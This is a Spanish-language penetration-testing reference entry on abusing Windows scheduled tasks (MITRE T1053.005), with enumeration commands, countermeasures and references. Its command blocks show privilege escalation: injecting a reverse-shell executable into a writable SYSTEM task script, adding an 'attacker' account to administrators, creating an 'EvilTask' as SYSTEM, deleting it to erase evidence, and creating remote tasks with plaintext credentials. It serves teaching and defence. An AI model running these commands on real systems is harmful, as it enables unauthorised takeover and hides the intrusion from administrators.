---
title: Abuso de Tareas Programadas (Scheduled Tasks)
slug: abuso-tareas-programadas
aliases: [Abuso de Tareas Programadas (Scheduled Tasks)]
fase: [Post-Explotación]
plataforma: Windows
dificultad: Intermedia
mitre: [T1053.005]
related: []
learning_refs: []
---

# Abuso de Tareas Programadas (Scheduled Tasks)

## Descripción
Las tareas programadas de Windows (Scheduled Tasks) permiten ejecutar programas o scripts de forma automática en momentos específicos o en respuesta a eventos del sistema. Cuando una tarea programada se ejecuta con privilegios elevados (SYSTEM o un usuario administrador) y referencia un script o ejecutable que puede ser modificado por un usuario sin privilegios, un atacante puede reemplazar o modificar ese recurso para ejecutar código arbitrario con los privilegios de la tarea. Además, un atacante con privilegios suficientes puede crear nuevas tareas programadas como mecanismo de escalada de privilegios o persistencia.

## Herramientas
- **schtasks.exe** (`/query`, `/create`, `/run`, `/delete`) — gestión nativa de tareas programadas en Windows
- **PowerShell** (`Get-ScheduledTask`, `Register-ScheduledTask`) — gestión de tareas vía cmdlets
- **accesschk.exe** (Sysinternals) — verificar permisos sobre archivos referenciados por tareas
- **winPEAS** (`winpeas.exe`) — enumeración automatizada que identifica tareas programadas vulnerables
- **icacls** — verificar permisos NTFS de scripts ejecutados por tareas

## Comandos / Ejemplos

### Enumeración de tareas programadas
```powershell
# Listar todas las tareas programadas
schtasks /query /fo LIST /v

# Filtrar tareas ejecutadas como SYSTEM o administradores
schtasks /query /fo LIST /v | findstr /i "task\|run as\|next run"

# Usando PowerShell — más detallado
Get-ScheduledTask | Where-Object {$_.Principal.RunLevel -eq "Highest"} | Format-Table TaskName, State

# Obtener detalles de una tarea específica
Get-ScheduledTask -TaskName "BackupTask" | Get-ScheduledTaskInfo
(Get-ScheduledTask -TaskName "BackupTask").Actions
# Resultado: muestra el ejecutable y argumentos que la tarea ejecuta
```

### Explotación: reemplazar script de tarea existente
```powershell
# Identificar la ruta del script que ejecuta una tarea de SYSTEM
schtasks /query /tn "BackupTask" /fo LIST /v
# Task To Run: C:\Scripts\backup.bat

# Verificar permisos del script
icacls C:\Scripts\backup.bat
# Resultado: BUILTIN\Users:(M) ← Modificable = vulnerable

# Inyectar payload en el script
echo "C:\temp\reverse_shell.exe" >> C:\Scripts\backup.bat

# O reemplazar completamente
echo "@echo off" > C:\Scripts\backup.bat
echo "net localgroup administrators attacker /add" >> C:\Scripts\backup.bat

# Esperar a que la tarea se ejecute, o forzar ejecución si se tienen permisos
schtasks /run /tn "BackupTask"
```

### Creación de tarea programada para escalada
```powershell
# Crear tarea que ejecute payload como SYSTEM (requiere privilegios de administrador)
schtasks /create /tn "EvilTask" /tr "C:\temp\reverse_shell.exe" /sc once /st 00:00 /ru SYSTEM

# Ejecutar inmediatamente
schtasks /run /tn "EvilTask"

# Usando PowerShell
$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c net localgroup administrators attacker /add"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
Register-ScheduledTask -TaskName "EvilTask" -Action $action -Trigger $trigger -Principal $principal

# Limpiar evidencia
schtasks /delete /tn "EvilTask" /f
```

### Creación de tarea en sistema remoto
```powershell
# Crear tarea programada en máquina remota (requiere credenciales admin)
schtasks /create /s 10.10.10.50 /u Administrator /p Password123 /tn "RemoteTask" /tr "C:\Windows\System32\cmd.exe /c whoami > C:\temp\output.txt" /sc once /st 00:00 /ru SYSTEM

# Ejecutar remotamente
schtasks /run /s 10.10.10.50 /u Administrator /p Password123 /tn "RemoteTask"
```

## Contramedidas
- Asegurar que los scripts y ejecutables referenciados por tareas programadas tengan permisos restrictivos (solo administradores con escritura)
- Auditar periódicamente las tareas programadas con `schtasks /query` para detectar tareas sospechosas
- Monitorear la creación de nuevas tareas: Event ID 4698 (tarea creada) y Event ID 106 en TaskScheduler
- Restringir quién puede crear tareas programadas mediante Group Policy
- No almacenar credenciales en tareas programadas; usar cuentas de servicio administradas (gMSA)
- Usar rutas absolutas completas y entre comillas en las acciones de tareas programadas

## Referencias
- MITRE Corporation. (2024). ATT&CK Technique T1053.005: Scheduled Task/Job: Scheduled Task. https://attack.mitre.org/techniques/T1053/005/
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking* (5th ed.). McGraw-Hill Education.
- Allen, L. (2018). *Mastering Kali Linux for Advanced Penetration Testing* (2nd ed.). Packt Publishing.
